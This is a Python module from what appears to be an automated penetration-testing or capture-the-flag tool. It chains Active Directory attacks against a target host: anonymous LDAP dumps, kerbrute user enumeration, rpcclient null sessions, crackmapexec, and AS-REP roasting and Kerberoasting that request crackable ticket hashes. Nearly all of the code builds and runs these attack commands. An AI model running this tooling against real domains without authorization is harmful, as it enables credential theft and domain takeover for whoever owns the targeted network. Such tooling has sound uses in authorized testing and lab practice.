"""AD enumeration: domain extraction, LDAP, kerbrute, AS-REP roasting, Kerberoasting."""

import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

from ..utils import (
    DEFAULT_TIMEOUT,
    KERBRUTE_USERLIST,
    Result,
    cmd_to_str,
    run_cmd,
    save_result,
)


def run_ad(
    target: str,
    services: dict[int, dict],
    username: str | None,
    password: str | None,
    domain: str | None,
    dry_run: bool,
    out_dir: str,
    progress_callback=None,
) -> list[Result]:
    """Run AD enumeration. Determines domain first, then runs unauthenticated + authenticated modules."""
    results = []
    ad_dir = os.path.join(out_dir, "ad")

    # Step 1: Extract domain
    if not domain:
        domain = extract_domain(target, services, dry_run)
        if not domain:
            if progress_callback:
                progress_callback("domain", None, None, "No domain found. Use --domain to specify manually.")
            print("[!] No domain identified. Use --domain to specify manually.")
            return results
        if progress_callback:
            progress_callback("domain", None, None, f"Using domain: {domain}")

    dc_ip = _find_dc_ip(target, services)

    if dry_run:
        _dry_run_ad(target, dc_ip, domain, username, password)
        return results

    # Step 2: Unauthenticated enumeration
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {}
        futures[executor.submit(_ldapsearch_anonymous, dc_ip, domain)] = "ldapsearch:anonymous"
        futures[executor.submit(_kerbrute_userenum, dc_ip, domain)] = "kerbrute"
        futures[executor.submit(_getnpusers, dc_ip, domain)] = "GetNPUsers"
        futures[executor.submit(_crackmapexec_smb, target)] = "crackmapexec:smb"
        futures[executor.submit(_rpcclient_anonymous, target)] = "rpcclient"

        for future in as_completed(futures):
            label = futures[future]
            result = future.result()
            if progress_callback:
                progress_callback(label, result)
            results.append(result)
            save_result(result, ad_dir)

    # Step 3: Authenticated enumeration (only if credentials provided)
    if username and password:
        with ThreadPoolExecutor(max_workers=3) as executor:
            auth_futures = {}
            auth_futures[executor.submit(_ldapsearch_auth, dc_ip, domain, username, password)] = "ldapsearch:auth"
            auth_futures[executor.submit(_crackmapexec_auth, target, domain, username, password)] = "crackmapexec:auth"
            auth_futures[executor.submit(_getuserspns, dc_ip, domain, username, password)] = "GetUserSPNs"

            for future in as_completed(auth_futures):
                label = auth_futures[future]
                result = future.result()
                if progress_callback:
                    progress_callback(label, result)
                results.append(result)
                save_result(result, ad_dir)

    return results


def extract_domain(target: str, services: dict[int, dict], dry_run: bool) -> str | None:
    """Domain extraction order: LDAP anonymous → nmap hostname → prompt user."""
    domain = _ldap_extract_domain(target)
    if domain:
        return domain

    # Check nmap hostname
    for info in services.values():
        hn = info.get("hostname", "").strip()
        if hn and "." in hn:
            # e.g. "dc01.htb.local" → "htb.local"
            return ".".join(hn.split(".")[1:])

    return None


def _ldap_extract_domain(target: str) -> str | None:
    """Try LDAP anonymous bind to extract default naming context."""
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{target}", "-s", "base", "namingcontexts"]
    result = run_cmd(cmd, timeout=30)
    if result.success:
        for line in result.stdout.splitlines():
            if "defaultNamingContext" in line or "namingcontexts:" in line:
                parts = line.split(":")
                if len(parts) > 1:
                    dc_str = parts[1].strip()
                    # DC=htb,DC=local → htb.local
                    domain = re.sub(r"[dD][cC]=(\w+)", r"\1.", dc_str)
                    return domain.rstrip(".").lower()
    return None


def _find_dc_ip(target: str, services: dict[int, dict]) -> str:
    """Find the domain controller IP - prefer port 389, then 636, fallback to target."""
    dc_ports = [p for p, s in services.items() if s.get("name", "") in ("ldap", "ldaps")]
    return target  # Simplified: use target IP directly


# --- Unauthenticated modules ---

def _ldapsearch_anonymous(dc_ip: str, domain: str) -> Result:
    base = ",".join(f"DC={dc}" for dc in domain.split("."))
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", base]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "ldapsearch"
    return result


def _kerbrute_userenum(dc_ip: str, domain: str) -> Result:
    cmd = ["kerbrute", "userenum", "-d", domain, "--dc", dc_ip, KERBRUTE_USERLIST]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "kerbrute"
    return result


def _getnpusers(dc_ip: str, domain: str) -> Result:
    """AS-REP Roasting via GetNPUsers from impacket."""
    cmd = ["GetNPUsers", "-dc-ip", dc_ip, f"{domain}/", "-request"]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "GetNPUsers"
    return result


def _crackmapexec_smb(target: str) -> Result:
    cmd = ["crackmapexec", "smb", target]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "crackmapexec"
    return result


def _rpcclient_anonymous(target: str) -> Result:
    cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "rpcclient"
    return result


# --- Authenticated modules ---

def _ldapsearch_auth(dc_ip: str, domain: str, username: str, password: str) -> Result:
    base = ",".join(f"DC={dc}" for dc in domain.split("."))
    user_principal = f"{username}@{domain}"
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-D", user_principal, "-w", password, "-b", base]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "ldapsearch"
    return result


def _crackmapexec_auth(target: str, domain: str, username: str, password: str) -> Result:
    cmd = ["crackmapexec", "smb", target, "-d", domain, "-u", username, "-p", password]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "crackmapexec"
    return result


def _getuserspns(dc_ip: str, domain: str, username: str, password: str) -> Result:
    """Kerberoasting via GetUserSPNs."""
    cmd = ["GetUserSPNs", "-dc-ip", dc_ip, f"{domain}/{username}:{password}", "-request"]
    result = run_cmd(cmd, timeout=DEFAULT_TIMEOUT)
    result.tool = "GetUserSPNs"
    return result


def _dry_run_ad(target: str, dc_ip: str, domain: str, username: str | None, password: str | None):
    """Print all AD commands without executing."""
    cmds = [
        ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", ",".join(f"DC={dc}" for dc in domain.split("."))],
        ["kerbrute", "userenum", "-d", domain, "--dc", dc_ip, KERBRUTE_USERLIST],
        ["GetNPUsers", "-dc-ip", dc_ip, f"{domain}/", "-request"],
        ["crackmapexec", "smb", target],
        ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"],
    ]
    for cmd in cmds:
        print(f"[DRY-RUN] {cmd_to_str(cmd)}")
    if username and password:
        auth_cmds = [
            ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-D", f"{username}@{domain}", "-w", password, "-b", ",".join(f"DC={dc}" for dc in domain.split("."))],
            ["crackmapexec", "smb", target, "-d", domain, "-u", username, "-p", password],
            ["GetUserSPNs", "-dc-ip", dc_ip, f"{domain}/{username}:{password}", "-request"],
        ]
        for cmd in auth_cmds:
            print(f"[DRY-RUN] {cmd_to_str(cmd)}")
